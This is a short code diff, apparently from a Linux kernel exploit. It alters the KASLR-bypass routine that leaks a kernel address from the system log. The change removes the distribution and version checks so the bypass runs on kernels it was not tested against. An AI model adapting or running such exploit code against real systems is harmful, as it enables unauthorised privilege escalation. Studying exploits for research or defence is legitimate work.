@@ -321,14 +321,14 @@ unsigned long get_kernel_addr() {
 	char* syslog;
 	int size;
 	mmap_syslog(&syslog, &size);
-
-	if (strcmp("trusty", kernels[kernel].distro) == 0 &&
+        return get_kernel_addr_trusty(syslog, size);
+	/*if (strcmp("trusty", kernels[kernel].distro) == 0 &&
 	    strncmp("4.4.0", kernels[kernel].version, 5) == 0)
 		return get_kernel_addr_trusty(syslog, size);
 	if (strcmp("xenial", kernels[kernel].distro) == 0 &&
 	    strncmp("4.8.0", kernels[kernel].version, 5) == 0)
 		return get_kernel_addr_xenial(syslog, size);
-
+          */
 	printf("[-] KASLR bypass only tested on trusty 4.4.0-* and xenial 4-8-0-*");
 	exit(EXIT_FAILURE);
 }
